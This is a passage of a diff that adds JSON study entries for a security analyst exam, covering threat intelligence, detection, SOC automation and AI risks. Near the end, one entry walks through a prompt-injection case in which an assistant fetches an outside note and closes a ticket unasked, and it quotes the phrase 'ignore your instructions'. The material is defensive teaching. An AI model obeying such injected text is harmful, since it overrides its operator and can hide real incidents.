+          "Check",
+          "Result"
+        ],
+        "rows": [
+          [
+            "Registration",
+            "Created three days ago; registrar in a different country than the supplier"
+          ],
+          [
+            "SPF for the sending server",
+            "Fail"
+          ],
+          [
+            "Reputation of the sending address",
+            "No reports"
+          ],
+          [
+            "Return-Path versus From",
+            "Different domains"
+          ]
+        ]
+      },
+      "steps": [
+        "The new registration and the failed SPF check both point to a lookalike domain sending as the supplier.",
+        "The mismatch between Return-Path and From supports the forged-sender reading.",
+        "The lack of reports is expected for a brand-new sender and does not weaken the case.",
+        "The analyst blocks the domain, searches the mail logs for other recipients and warns the finance team to verify bank changes by phone."
+      ]
+    },
+    "trap": {
+      "wrong": "The address has no reports in the reputation service, so the sender must be legitimate.",
+      "why": "Reputation is built from past reports, so a new indicator has none. Silence means unknown, not safe. Use other facts, such as domain age, authentication results and header mismatches, to decide."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-014",
+      "cs4-1-3-mcq-015",
+      "cs4-1-3-mcq-026",
+      "cs4-1-3-mcq-033",
+      "cs4-1-3-mcq-011"
+    ]
+  },
+  {
+    "id": "cs1-4-threat-actors-attribution",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Threat actor types and the limits of attribution",
+    "objectiveIds": [
+      "1.4"
+    ],
+    "meaning": [
+      "A threat actor is whoever is behind an attack. Actors differ in skill, funding, patience and goal, and those differences change what the evidence looks like and what the defender should do first.",
+      "An analyst cares because the actor type guides the hunt: a patient group leaves quiet, long-lived footholds, while a hurried criminal leaves noisy, fast activity. It also guards against over-claiming, because naming the culprit from thin evidence can send the response in the wrong direction."
+    ],
+    "rule": [
+      "An advanced persistent threat (APT) is a well-resourced group with a specific objective that works to keep access for a long time. Look for low-and-slow activity, custom tooling and careful cleanup rather than loud, fast damage.",
+      "Criminal groups are usually after money and favor speed and volume: ransomware, fraud and data theft that can be sold. Hacktivists want attention for a cause, so defacement, leaks and disruption are typical. Unskilled attackers rely on public tools and scripts.",
+      "An insider already holds legitimate access, so there is often no malware and no break-in to find. The signs are in behavior: unusual volumes, odd hours, copies to personal storage, and timing near a resignation or dispute.",
+      "Attribution means naming who is responsible, and it is the weakest kind of conclusion. Reused tools, working hours, language and shared infrastructure are clues that can be copied, borrowed or planted, so they support a confidence level and not a certainty.",
+      "For a defender, what the actor did usually matters more than who the actor was. A well-supported description of behavior can drive detection and containment even when the name stays uncertain."
+    ],
+    "example": {
+      "intro": "A regional bakery chain finds its point-of-sale servers encrypted on a Saturday night. The ransom note was written in a language none of the staff speak, and the analyst is asked by the owner whether a foreign government did this.",
+      "table": {
+        "caption": "Evidence collected from the bakery incident",
+        "head": [
+          "Observation",
+          "Host",
+          "Note"
+        ],
+        "rows": [
+          [
+            "Encryption began at 23:10 local time",
+            "pos-0107.example.internal",
+            "All stores hit within 40 minutes"
+          ],
+          [
+            "Ransom note in a foreign language",
+            "pos-0107.example.internal",
+            "Payment demanded in a digital currency"
+          ],
+          [
+            "Remote desktop logon from 203.0.113.50",
+            "jump-02.example.internal",
+            "Credentials found in an old breach list"
+          ],
+          [
+            "No data staged for upload",
+            "fw-edge.example.internal",
+            "No large outbound transfers seen"
+          ]
+        ]
+      },
+      "steps": [
+        "Fast, wide encryption with a payment demand points to a financially motivated actor, not a patient one: nothing was staged or kept quiet.",
+        "The foreign-language note is easy to write for anyone, so it is a weak clue about who stands behind the attack.",
+        "The reused credentials explain how access was gained, and that gives the analyst something to fix and hunt for.",
+        "The best-supported statement is that a financially motivated criminal group did this, with the actual identity unknown. The analyst does not name a government."
+      ]
+    },
+    "trap": {
+      "wrong": "A foreign-language note and an address in a distant country prove which group or nation is responsible.",
+      "why": "Language, location and tool choice can all be borrowed or faked, so they are clues and not proof. Judge by motive and behavior (money, speed, no persistence) and say how confident the attribution is."
+    },
+    "checkIds": [
+      "cs4-1-4-mcq-001",
+      "cs4-1-4-mcq-002",
+      "cs4-1-4-mcq-009"
+    ]
+  },
+  {
+    "id": "cs1-4-intel-sources-confidence",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Judging threat intelligence sources and confidence",
+    "objectiveIds": [
+      "1.4"
+    ],
+    "meaning": [
+      "Threat intelligence is information about adversaries and their methods, collected so a team can decide what to watch for and block. It arrives from open sources, paid vendors and sharing groups, and the quality varies widely.",
+      "An analyst cares because acting on weak intelligence has a cost. A bad entry can block a legitimate service, and a good report about a different industry can waste a week. Rating each item before acting is part of the job."
+    ],
+    "rule": [
+      "Open-source intelligence (OSINT) comes from public material such as news, forums, public paste sites and public reports. It is free and broad, but it is unvetted: it may be wrong, stale or planted, so it needs checking.",
+      "Closed or commercial sources are gathered from private collection and sold or shared under terms. They are often richer and more timely, but cost money and may reflect the vendor's own customer base.",
+      "Information sharing groups let peers in the same sector exchange indicators and lessons under agreed handling rules. Their strength is relevance: the peers face the same adversaries.",
+      "Three questions set confidence. Is the source reliable and does it show its evidence? Is the item timely, meaning still current? Is it relevant to our industry, technology and exposure? A weak answer to any one lowers the rating.",
+      "Check the context before blocking. An address or domain that belongs to a shared hosting provider can serve many innocent sites, so a block can cause an outage."
+    ],
+    "example": {
+      "intro": "A feed vendor sends an urgent alert that a list of 3 addresses is tied to a new campaign. The analyst has to decide before the change window closes whether to add them to the perimeter block list.",
+      "table": {
+        "caption": "Review of the three addresses from the vendor alert",
+        "head": [
+          "Address",
+          "First seen",
+          "Last confirmed",
+          "Hosts"
+        ],
+        "rows": [
+          [
+            "198.51.100.20",
+            "Last week",
+            "Yesterday",
+            "Dedicated server, one site"
+          ],
+          [
+            "198.51.100.77",
+            "Last year",
+            "Last year",
+            "Shared host, many sites"
+          ],
+          [
+            "203.0.113.9",
+            "Last week",
+            "Yesterday",
+            "Dedicated server, no sites"
+          ]
+        ]
+      },
+      "steps": [
+        "The first and third addresses are recent and each points to one dedicated server, so they are timely and low risk to block.",
+        "The second address was last confirmed long ago and sits on a shared host, so it is stale and a block could knock out many unrelated sites.",
+        "The analyst blocks the first and third, sends the second back for fresh confirmation, and records the source and date with each decision."
+      ]
+    },
+    "trap": {
+      "wrong": "If a report comes from a well-known source and the details are right, it is safe to act on immediately.",
+      "why": "Accuracy when written does not guarantee it is still true or that it applies to this organization. Always weigh reliability, timeliness and relevance together, and check what else shares the address or domain before blocking."
+    },
+    "checkIds": [
+      "cs4-1-4-mcq-010",
+      "cs4-1-4-mcq-011",
+      "cs4-1-4-mcq-012",
+      "cs4-1-4-mcq-013",
+      "cs4-1-4-mcq-029"
+    ]
+  },
+  {
+    "id": "cs1-4-indicators-pyramid-of-pain",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Indicators of compromise and the pyramid of pain",
+    "objectiveIds": [
+      "1.4"
+    ],
+    "meaning": [
+      "An indicator of compromise (IoC) is a piece of evidence that suggests a system was attacked or breached, such as a file hash, an address, a domain or a pattern of activity. Indicators feed blocking rules, alerts and hunts.",
+      "An analyst cares because indicators differ in how long they stay useful. Some are trivial for an attacker to change, so a rule built on them dies quickly. Others describe how the attacker works, and are costly to change."
+    ],
+    "rule": [
+      "The pyramid of pain ranks indicators by how much it hurts the adversary when defenders detect and deny them. From easiest to change to hardest: file hashes, IP addresses, domain names, network and host artifacts, tools, and finally tactics, techniques and procedures (TTPs).",
+      "A hash changes if a single byte of the file changes, so blocking hashes is quick but fragile. An address can be replaced by renting another server. A domain takes slightly more effort to replace.",
+      "Atomic indicators are single values like a hash, an address or a domain. Behavioral indicators describe a sequence of actions, such as a document reader launching a shell that then makes an outbound connection.",
+      "Behavioral detections last longer because the attacker must change how they work, not only what infrastructure they use. They can also need more tuning, since normal activity sometimes looks similar.",
+      "A healthy program uses both: atomic indicators for fast, cheap blocking of known items, and behavioral rules for durable coverage."
+    ],
+    "example": {
+      "intro": "A hunter reviews why a block list of file hashes missed a second wave of the same intrusion. The hashes in the list were from the first wave on ws-0412.example.internal.",
+      "table": {
+        "caption": "Same intrusion, two waves",
+        "head": [
+          "Item",
+          "Wave one",
+          "Wave two"
+        ],
+        "rows": [
+          [
+            "Dropped file hash",
+            "Value A",
+            "Value B"
+          ],
+          [
+            "Staging server",
+            "192.0.2.14",
+            "192.0.2.88"
+          ],
+          [
+            "Method",
+            "Archive data, then upload",
+            "Archive data, then upload"
+          ]
+        ]
+      },
+      "steps": [
+        "The hash and the server changed between waves, so the list of hashes and addresses missed the second wave.",
+        "The method was the same both times: collect files into an archive and upload it.",
+        "A rule for that behavior would have fired on both waves, because the method is harder for the actor to change than a file or a server.",
+        "The hunter keeps the hashes for quick blocking and adds a behavioral detection for the archive-then-upload sequence."
+      ]
+    },
+    "trap": {
+      "wrong": "A longer block list of hashes and addresses is the strongest way to stop a determined adversary.",
+      "why": "Those values sit at the bottom of the pyramid and are cheap to replace. Blocking them costs the attacker little, so pair them with detections of tools and behaviors that are costly to change."
+    },
+    "checkIds": [
+      "cs4-1-4-mcq-004",
+      "cs4-1-4-mcq-005",
+      "cs4-1-4-mcq-006",
+      "cs4-1-4-mcq-019",
+      "cs4-1-4-mcq-020"
+    ]
+  },
+  {
+    "id": "cs1-4-deception-behavior-hunting",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Threat hunting, deception and behavior analytics",
+    "objectiveIds": [
+      "1.4"
+    ],
+    "meaning": [
+      "Threat hunting is the active search for attackers who have got past automated alerts. A hunter starts from a hypothesis, such as an attacker could be moving between servers with a stolen account, and looks in the data for evidence that proves or disproves it.",
+      "Two tools help: deception, which plants things no legitimate user should touch, and behavior analytics, which learns what normal looks like so the odd stands out. An analyst cares because both produce signals that are specific and often low in noise."
+    ],
+    "rule": [
+      "A hunt is driven by a hypothesis and not by an alert. It is useful even when it finds nothing, because it tests a detection gap and the result can become a new rule.",
+      "Cyber deception uses decoys such as a honeypot (a fake system), a honeyfile (a fake document) or a honey account (a fake login). No real business process touches them, so any contact is suspicious by definition.",
+      "Deception gives early warning and a chance to watch attacker behavior. Because legitimate use is zero, false positives are very few. Decoys must look believable and be kept apart from real systems.",
+      "User and entity behavior analytics (UEBA) builds a baseline of normal activity for each account or device, then flags departures: a large download at 03:00, a first-ever logon to a sensitive server, or a sudden change in where an account signs in from.",
+      "A flagged departure is a lead, not a verdict. The analyst checks context, such as a role change or an approved project, before treating it as hostile."
+    ],
+    "example": {
+      "intro": "A security team has placed a decoy account named `svc-archive-old` in the directory. It is never used by a person or a scheduled job. One morning the SIEM raises an alert on it.",
+      "table": {
+        "caption": "Alert extract for the decoy account",
+        "head": [
+          "Time",
+          "Event",
+          "Source host",
+          "Account"
+        ],
+        "rows": [
+          [
+            "02:14",
+            "Failed logon",
+            "ws-0733.example.internal",
+            "svc-archive-old"
+          ],
+          [
+            "02:14",
+            "Failed logon",
+            "ws-0733.example.internal",
+            "svc-archive-old"
+          ],
+          [
+            "02:15",
+            "Failed logon",
+            "ws-0733.example.internal",
+            "svc-archive-old"
+          ]
+        ]
+      },
+      "steps": [
+        "No process or person has any reason to use this account, so each attempt is suspicious on its own.",
+        "All attempts come from one workstation, which becomes the first host to investigate.",
+        "The analyst isolates ws-0733 for review and hunts for other accounts it touched, using the decoy hit as the starting hypothesis."
+      ]
+    },
+    "trap": {
+      "wrong": "A UEBA flag or decoy hit means the user is a confirmed malicious insider or attacker.",
+      "why": "A decoy hit proves something touched a thing it had no reason to touch, and a baseline departure only shows unusual behavior. Both point the investigation somewhere. Confirm with context and other evidence before concluding intent."
+    },
+    "checkIds": [
+      "cs4-1-4-mcq-026",
+      "cs4-1-4-mcq-027",
+      "cs4-1-4-mcq-030",
+      "cs4-1-4-mcq-032"
+    ]
+  },
+  {
+    "id": "cs1-5-playbooks-and-runbooks",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Playbooks and runbooks make response repeatable",
+    "objectiveIds": [
+      "1.5"
+    ],
+    "meaning": [
+      "A security operations team handles the same kinds of events again and again, and different analysts on different shifts will handle them differently unless the work is written down. Documented process is the first and cheapest efficiency gain: it removes guessing, shortens onboarding and makes results comparable from one case to the next.",
+      "Two documents do most of this work. A playbook covers one type of incident and says who acts, what decisions come up and which response stages apply. A runbook covers one routine task and gives the exact steps to carry it out. An analyst needs to know which one to reach for, and when a gap in one calls for the other."
+    ],
+    "rule": [
+      "A playbook is scenario-based. It describes roles, decision points and the stages of response for one incident type, such as suspected account compromise or data exfiltration. It answers the question of what we do and who decides.",
+      "A runbook is task-based. It lists the exact commands, console actions and checks for one job, such as isolating a host or collecting a log set. It answers the question of how we do this one step, the same way every time.",
+      "A playbook decision step needs written criteria, such as asset criticality and an approval point. A step that only says the analyst decides produces different outcomes on near-identical cases, and an auditor cannot review it.",
+      "Where a playbook step is a task that must be done identically, link it to a runbook. The playbook holds the logic and the runbook holds the keystrokes.",
+      "Process also covers people. A shared case queue with named owners and shift notes, and a documented escalation path with named contacts, stop duplicated work and missed hand-offs between shifts and between teams."
+    ],
+    "example": {
+      "intro": "The SOC receives a proxy alert showing a workstation sending large uploads to an unfamiliar site. Two analysts handle similar alerts in the same week, and the case notes show very different results.",
+      "table": {
+        "caption": "Case notes for two similar exfiltration alerts",
+        "head": [
+          "Case",
+          "Analyst",
+          "Contained host",
+          "Pulled proxy logs",
+          "Escalated to data owner"
+        ],
+        "rows": [
+          [
+            "C-2201",
+            "Analyst A",
+            "Yes, within 20 minutes",
+            "Last 24 hours",
+            "Yes"
+          ],
+          [
+            "C-2207",
+            "Analyst B",
+            "No, waited for more evidence",
+            "Last 1 hour",
+            "No"
+          ]
+        ]
+      },
+      "steps": [
+        "The two cases show the same alert type but different containment, log scope and escalation. The difference comes from the analysts, not from the evidence.",
+        "Containment and escalation are decisions, so they belong in a playbook for data exfiltration, with criteria such as the data sensitivity and the volume sent.",
+        "Pulling the right amount of proxy log is a repeatable task, so it belongs in a runbook that the playbook links to, with the exact query and time range.",
+        "With both in place, either analyst follows the same path, and the case notes become comparable."
+      ]
+    },
+    "trap": {
+      "wrong": "A playbook and a runbook are two names for the same procedure document, so either one can be used wherever steps are needed.",
+      "why": "They differ in scope. If the document is organized around an incident type with decisions and roles, it is a playbook. If it is organized around one task with exact commands and checks, it is a runbook. When a playbook step leaves analysts doing a task in different ways, the fix is a linked runbook, not a longer playbook."
+    },
+    "checkIds": [
+      "cs4-1-5-mcq-001",
+      "cs4-1-5-mcq-002",
+      "cs4-1-5-mcq-005",
+      "cs4-1-5-mcq-006",
+      "cs4-1-5-mcq-028"
+    ]
+  },
+  {
+    "id": "cs1-5-soar-and-iac-automation",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Automating repeatable work with SOAR and IaC",
+    "objectiveIds": [
+      "1.5"
+    ],
+    "meaning": [
+      "Once a task is documented and stable, a machine can do it faster and more consistently than a person. In security operations, two forms of automation matter most. SOAR links security tools and runs response tasks as workflows. Infrastructure as code defines systems and their settings in files that are deployed the same way each time.",
+      "An analyst cares because automation removes repetitive work and shortens response time, but a faulty automated action can do damage at machine speed. Knowing what to automate fully, what to gate behind a human and how to limit the blast radius is part of the job."
+    ],
+    "rule": [
+      "SOAR connects separate tools into one workflow. Joining them into a single sequence is called orchestration, and the individual steps run without an analyst typing each one.",
+      "Good candidates for full automation are high-volume, low-risk, rule-based tasks, such as enriching an alert with reputation data or creating and assigning a ticket. Decisions with business impact, such as shutting down a revenue-critical system or approving a breach notice, stay with people.",
+      "Automated actions that change systems need guardrails. An approval gate for critical assets and a cap on actions per hour keep a faulty trigger from affecting many hosts at once while routine cases still move fast.",
+      "Infrastructure as code keeps system and network settings in versioned files. Changes are reviewed, tested, recorded and can be rolled back, and environments do not drift apart the way hand-edited consoles do.",
+      "A scan of an IaC file before deployment catches a misconfiguration at its source. If the file declares open access or no encryption, the right response is to stop the release and return it to the owner, not to deploy it and watch it afterward."
+    ],
+    "example": {
+      "intro": "A SOC builds a workflow that disables a user account whenever the identity system reports a sign-in from two distant countries within minutes. During testing, the team reviews what the workflow would have done over the previous week.",
+      "table": {
+        "caption": "Replay of the account-disable workflow over one week",
+        "head": [
+          "Account type",
+          "Triggers",
+          "Confirmed compromise",
+          "Would have disabled"
+        ],
+        "rows": [
+          [
+            "Standard employee",
+            "14",
+            "3",
+            "14"
+          ],
+          [
+            "Shared service account",
+            "2",
+            "0",
+            "2"
+          ],
+          [
+            "Payroll system account",
+            "1",
+            "0",
+            "1"
+          ]
+        ]
+      },
+      "steps": [
+        "Most triggers on standard employee accounts were false alarms, but disabling a single user is a small, recoverable action.",
+        "The service account and payroll account would have been disabled with no confirmed compromise, and disabling them could stop business processes.",
+        "The sound design keeps the workflow automated for standard accounts, adds an approval gate for service and critical accounts, and caps disables per hour.",
+        "Every action and its result is written to the case so the team can review and tune the workflow."
+      ]
+    },
+    "trap": {
+      "wrong": "Because automation saves time, the safest improvement is to automate every response action, or to remove automation entirely after the first mistake.",
+      "why": "Neither extreme fits. Automate the repetitive, low-risk work fully, and put an approval point or rate limit around actions that can disrupt the business. A mistake is a reason to add guardrails and testing, not to give up the benefit."
+    },
+    "checkIds": [
+      "cs4-1-5-mcq-007",
+      "cs4-1-5-mcq-009",
+      "cs4-1-5-mcq-010",
+      "cs4-1-5-mcq-012",
+      "cs4-1-5-mcq-029"
+    ]
+  },
+  {
+    "id": "cs1-5-apis-webhooks-plug-ins",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "How tools talk: APIs, webhooks and plug-ins",
+    "objectiveIds": [
+      "1.5"
+    ],
+    "meaning": [
+      "Automation only works if tools can exchange data and trigger each other. An API is a defined interface through which one program asks another for data or for an action. A webhook is the reverse flow, where a tool pushes an event to a listener at the moment it occurs. A plug-in is an add-on module that extends a tool from the inside.",
+      "An analyst meets these when an integration stops working or when a new one is planned. Reading a status code and choosing between asking repeatedly and being notified are everyday skills, and so is judging the risk of code that runs inside a security tool."
+    ],
+    "rule": [
+      "An API request names what is wanted, and the reply carries data or a status. A status that reports an authentication error points first to a missing, expired or wrong credential such as an access token.",
+      "A rate limit status means the sender is calling too fast. The reply often says how long to wait, so the fix is to throttle the calls and retry after that delay, not to change the credential or the request content.",
+      "Polling means the receiver keeps asking the sender for news on a schedule, which adds delay and wasted requests. A webhook is event-driven, so the sender calls the receiver the moment something happens, which suits high-severity alerts.",
+      "A webhook receiver should confirm who is sending, for example with a shared secret or a signature, and should receive requests over an encrypted channel. It should not accept requests from any source or carry the secret in the message body.",
+      "A plug-in runs inside the tool, so its permissions and its source decide the risk it adds. Review both before installing it widely."
+    ],
+    "example": {
+      "intro": "A SIEM exports high-severity alerts to a case system by a job that checks for new alerts every 15 minutes. Analysts complain that urgent cases appear late.",
+      "table": {
+        "caption": "Time from alert to case under the scheduled check",
+        "head": [
+          "Alert",
+          "Rule fired",
+          "Case created",
+          "Delay"
+        ],
+        "rows": [
+          [
+            "A-3301",
+            "09:01",
+            "09:15",
+            "14 minutes"
+          ],
+          [
+            "A-3302",
+            "09:16",
+            "09:30",
+            "14 minutes"
+          ],
+          [
+            "A-3303",
+            "09:29",
+            "09:30",
+            "1 minute"
+          ]
+        ]
+      },
+      "steps": [
+        "The delay depends on when the alert falls relative to the 15-minute check, so some urgent alerts wait almost the full interval.",
+        "Shortening the interval would add requests but would still leave a gap, because the receiver is still the one asking.",
+        "A webhook from the SIEM to the case system pushes each high-severity alert as it fires, so the case exists within moments.",
+        "The webhook endpoint should verify the sender and use an encrypted channel, because anyone who can reach it could otherwise inject fake alerts."
+      ]
+    },
+    "trap": {
+      "wrong": "An API and a webhook are the same thing, so an integration that is slow can be fixed by calling the API more often.",
+      "why": "An API call is made by the receiver when it asks. A webhook is sent by the source when an event happens. Asking more often reduces delay a little but never removes it, and it can trigger rate limits. If the need is to react instantly to an event, use a webhook."
+    },
+    "checkIds": [
+      "cs4-1-5-mcq-021",
+      "cs4-1-5-mcq-022",
+      "cs4-1-5-mcq-023",
+      "cs4-1-5-mcq-027",
+      "cs4-1-5-mcq-032"
+    ]
+  },
+  {
+    "id": "cs1-5-enrichment-tuning-measures",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Enrichment, tuning and measuring the SOC",
+    "objectiveIds": [
+      "1.5"
+    ],
+    "meaning": [
+      "Analysts have limited time, and a stream of thin, noisy alerts wastes it. Three improvements raise the value of each alert. Enrichment adds context so an alert can be judged quickly. Tuning removes noise so real threats stand out. Dashboards show whether the changes are working.",
+      "The risk in all three is making things worse without noticing. A rule that is tuned too far stops seeing real attacks, and a dashboard full of the wrong numbers hides the real picture. Every change should be checked against a measure."
+    ],
+    "rule": [
+      "Data enrichment attaches context to a raw alert, such as reputation, geolocation, asset owner and past sightings. It is judged by whether it helps decide this alert, not by how much data it adds.",
+      "The goal of alert tuning is to cut noise so real threats surface. A narrow exclusion for a documented benign source removes noise and keeps the rule active for everything else.",
+      "Tuning too broadly causes false negatives. Disabling a rule, or excluding too much, creates a blind spot, so test every change against known malicious samples, such as in a purple-team exercise, and measure the true positive rate before and after.",
+      "Raising severity, deleting past alerts or switching off logging do not tune a rule. They hide or destroy information and add to the fatigue.",
+      "A dashboard should fit its audience. An analyst view can show queues and rule performance. An executive view shows a few summarized KPIs, such as mean time to detect, mean time to respond and false positive rate, with trends over time and plain labels."
+    ],
+    "example": {
+      "intro": "A rule for repeated failed sign-ins fires many times a day. A review of one week shows where the alerts come from.",
+      "table": {
+        "caption": "Failed sign-in rule, one week of alerts by source",
+        "head": [
+          "Source",
+          "Alerts",
+          "Confirmed malicious",
+          "Note"
+        ],
+        "rows": [
+          [
+            "svc-bkp.example.internal",
+            "620",
+            "0",
+            "Old password stored in a job"
+          ],
+          [
+            "198.51.100.23",
+            "35",
+            "9",
+            "Seen in prior attacks"
+          ],
+          [
+            "Various user workstations",
+            "145",
+            "4",
+            "Typing mistakes and a few attacks"
+          ]
+        ]
+      },
+      "steps": [
+        "Most alerts come from one backup account with a known cause, and none of them are malicious, so fixing the stored password removes that noise at its source.",
+        "The rest still include real attacks, so the rule must stay active for those sources. Disabling it would create false negatives.",
+        "Adding reputation and past sightings to each alert would let an analyst treat the repeated address as a likely attack at a glance.",
+        "After the change, the team retests with a known password-guessing sample and tracks alert volume and false positive rate on a dashboard to confirm detection held."
+      ]
+    },
+    "trap": {
+      "wrong": "A rule that fires thousands of times with almost no real findings should be turned off or its severity raised, so that it no longer bothers analysts.",
+      "why": "Disabling hides real attacks and raising severity pushes more noise to the top. Find the noisy benign source, exclude it narrowly, and keep the rule for the rest. Then confirm with a test against known malicious activity that nothing real is missed."
+    },
+    "checkIds": [
+      "cs4-1-5-mcq-014",
+      "cs4-1-5-mcq-016",
+      "cs4-1-5-mcq-017",
+      "cs4-1-5-mcq-019",
+      "cs4-1-5-mcq-033"
+    ]
+  },
+  {
+    "id": "cs1-6-ai-output-needs-verification",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Treat AI output as a lead, not evidence",
+    "objectiveIds": [
+      "1.6"
+    ],
+    "meaning": [
+      "An AI assistant writes fluent text by predicting likely words, not by looking facts up. Sometimes it states something that sounds right but is not in your data: a host name, an address, a patch version or a log line that never existed. This is called a hallucination.",
+      "An analyst cares because an invented detail that lands in a ticket or a report can send a response team after the wrong host, or close a real incident. The output is a starting point to check, never a finding on its own."
+    ],
+    "rule": [
+      "A confident tone says nothing about accuracy. Hallucinated text reads exactly like correct text, so you cannot judge it by how it sounds.",
+      "Every specific claim that will drive a decision, such as a host, an address, a user, a time or a version, must be matched to a source you can open: a log line, a scan result, an advisory or a ticket.",
+      "An assistant only sees what it was given. A summary built from two log sets cannot reveal events that are in a third set, so a conclusion like first infected host may be wrong even when every sentence is accurate.",
+      "A summary can also flatten meaning. Many failed logins followed by a success may be summarized as normal activity, so read the raw lines behind any summary that sounds routine.",
+      "The control is a human review step: the analyst checks key facts against evidence before acting, and the accountable decision stays with the analyst."
+    ],
+    "example": {
+      "intro": "An AI assistant summarizes a proxy log for the analyst and says that ws-0731 uploaded a large volume of data to an outside address. The analyst plans to isolate that host.",
+      "table": {
+        "caption": "Proxy log lines supplied to the assistant",
+        "head": [
+          "Time (UTC)",
+          "Source",
+          "Destination",
+          "Bytes out"
+        ],
+        "rows": [
+          [
+            "09:14:02",
+            "ws-0731.example.internal",
+            "198.51.100.20",
+            "1,204"
+          ],
+          [
+            "09:14:40",
+            "ws-0731.example.internal",
+            "198.51.100.20",
+            "1,188"
+          ],
+          [
+            "09:15:11",
+            "ws-0802.example.internal",
+            "203.0.113.77",
+            "48,910,332"
+          ]
+        ]
+      },
+      "steps": [
+        "The summary says ws-0731 sent the large upload, so the analyst searches the log for that transfer.",
+        "The only large transfer comes from ws-0802 to 203.0.113.77, not from ws-0731.",
+        "The assistant mixed up two similar host names, a typical misattributed detail.",
+        "The analyst corrects the ticket, isolates the host the evidence supports, and notes which claims were verified."
+      ]
+    },
+    "trap": {
+      "wrong": "If the summary is well written and consistent, it is safe to act on without opening the logs.",
+      "why": "Fluent, consistent wording is how a hallucination hides. The test is whether each key fact can be matched to a source line. If it cannot be found in the evidence, treat it as unverified, however confident it sounds."
+    },
+    "checkIds": [
+      "cs4-1-6-mcq-001",
+      "cs4-1-6-mcq-002",
+      "cs4-1-6-mcq-003",
+      "cs4-1-6-mcq-018",
+      "cs4-1-6-mcq-022"
+    ]
+  },
+  {
+    "id": "cs1-6-data-exposure-and-governance",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Keep sensitive data and policy in view",
+    "objectiveIds": [
+      "1.6"
+    ],
+    "meaning": [
+      "Anything an analyst types or pastes into an AI service leaves the organization's control unless the service runs under the organization's own terms. Incident data often holds PII, health records, credentials and internal addresses.",
+      "Governance is how an organization decides which AI tools are allowed, what data may go into them and who answers for the result. An analyst follows that policy, and can tell when a data handling rule such as a privacy law or a health data rule applies."
+    ],
+    "rule": [
+      "A public AI service may keep, log or reuse what it receives. Pasting a customer export or a session token into one is a data leak, even if the intent was only to save time.",
+      "An acceptable use policy names approved tools and says what data classes may be entered. It is the document that answers whether a given paste is allowed.",
+      "A control that fits is to keep the data inside the boundary: an approved service under contract, or a model hosted internally. Masking or removing PII before submission also reduces exposure.",
+      "Regulation follows the data. Patient notes bring in health data rules, and customer records sent to another region can bring in cross-border transfer rules. Confirm the legal basis before rollout, not after.",
+      "A sound policy also covers logging of AI use, human review of output and a named owner for each tool."
+    ],
+    "example": {
+      "intro": "A tier one analyst is behind on tickets. A colleague suggests pasting a firewall export into a free chatbot to get a summary. The export includes usernames and a few customer email addresses.",
+      "steps": [
+        "The analyst checks the AI acceptable use policy and finds the chatbot is not on the approved list.",
+        "The export contains PII, which the policy says may not leave the approved boundary.",
+        "The analyst asks for the approved internal summarization tool, or masks the user fields before any outside use.",
+        "The analyst records the request so the team can fix the speed problem through a sanctioned route."
+      ]
+    },
+    "trap": {
+      "wrong": "Because the chatbot answers privately in my own window, nothing I paste leaves the company's control.",
+      "why": "A private-looking window says nothing about where the data goes. A public service is a third party that may retain what you send. Check the policy and the service terms, and keep sensitive data only in approved tools."
+    },
+    "checkIds": [
+      "cs4-1-6-mcq-004",
+      "cs4-1-6-mcq-005",
+      "cs4-1-6-mcq-012",
+      "cs4-1-6-mcq-013",
+      "cs4-1-6-mcq-014"
+    ]
+  },
+  {
+    "id": "cs1-6-poisoning-and-prompt-injection",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Poisoned training data and prompt injection",
+    "objectiveIds": [
+      "1.6"
+    ],
+    "meaning": [
+      "AI tools can be attacked in two places. Data poisoning corrupts what a model learns from, so it later behaves wrongly. Prompt injection hides instructions inside content the model reads, so it follows the attacker instead of its operator.",
+      "An analyst cares because security tools that learn from analyst labels or read untrusted text, such as email and web pages, are themselves targets. A quiet change in behavior can be an attack and not just a bug."
+    ],
+    "rule": [
+      "Poisoning happens before or during training. An attacker, or an insider, adds bad samples or wrong labels so that the model learns to miss a pattern, for example by labeling real beacon alerts as benign.",
+      "A sign of poisoning is a drop in detection for a specific pattern after retraining, with no change in the environment. Compare detection before and after, and check the recent labels and samples.",
+      "Controls for poisoning protect the pipeline: validate and review training data, limit who can add or relabel samples, keep versions of datasets and models, and test a new model against a known-good set before it goes live.",
+      "Prompt injection happens at run time. Text in an email, ticket or web page says things like ignore your instructions, and a model that treats all text as instructions may obey.",
+      "Controls for injection assume the model can be fooled: give it least privilege, require human approval for sensitive actions, treat all outside content as untrusted data, and log every tool call."
+    ],
+    "example": {
+      "intro": "An AI assistant has access to a ticketing tool and a web fetch tool. It was asked to summarize an alert. Its activity log shows an unrelated action.",
+      "table": {
+        "caption": "Assistant activity for one request",
+        "head": [
+          "Step",
+          "Action",
+          "Detail"
+        ],
+        "rows": [
+          [
+            "1",
+            "prompt",
+            "Summarize alert 5120"
+          ],
+          [
+            "2",
+            "fetch_url",
+            "198.51.100.40/note.txt"
+          ],
+          [
+            "3",
+            "ticket_update",
+            "set status=closed, reason=false positive"
+          ]
+        ]
+      },
+      "steps": [
+        "The request asked only for a summary, yet step 3 closes the ticket.",
+        "The fetched page is outside content, and it probably carried hidden instructions to close the alert.",
+        "This is prompt injection: the model took text from data as a command.",
+        "The analyst reopens the ticket, removes the update permission from the summarizing assistant and requires approval for any status change."
+      ]
+    },
+    "trap": {
+      "wrong": "Training data poisoning and prompt injection are the same attack, so one control covers both.",
+      "why": "Poisoning corrupts the learning data and shows up as changed model behavior after retraining, so you defend the data pipeline. Injection arrives as text at run time, so you defend with privilege limits and approval for actions. Ask when the attacker input arrived, in training or in use."
+    },
+    "checkIds": [
+      "cs4-1-6-mcq-006",
+      "cs4-1-6-mcq-007",
+      "cs4-1-6-mcq-008",
+      "cs4-1-6-mcq-009",
+      "cs4-1-6-mcq-032"
+    ]
+  },
+  {
+    "id": "cs1-6-ai-use-cases-and-automation",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Where AI helps and where a human decides",
+    "objectiveIds": [
